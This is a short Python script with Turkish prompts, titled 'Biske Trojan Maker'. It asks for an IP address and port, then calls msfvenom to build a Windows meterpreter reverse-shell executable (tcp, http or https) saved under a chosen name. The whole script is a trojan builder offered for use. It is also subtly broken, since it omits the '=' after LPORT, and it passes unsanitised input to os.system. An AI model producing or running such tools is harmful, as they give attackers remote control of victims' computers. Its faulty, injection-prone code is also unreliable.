#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Biske")
os.system("figlet TROJAN MAKER")

print("""
Biske Trojan oluşturma Aracına Hoş Geldin...
""")

ip=input("Lokal ya da Dış ip girin : ")
port=input("portunu gir : ")

print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")

payload= input("Payload numarası girin : ")
kayityeri=input("Trojan kayıt adını yazın : ")

if payload=="1":
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)
	
elif payload=="2":
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)

elif payload=="3":
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)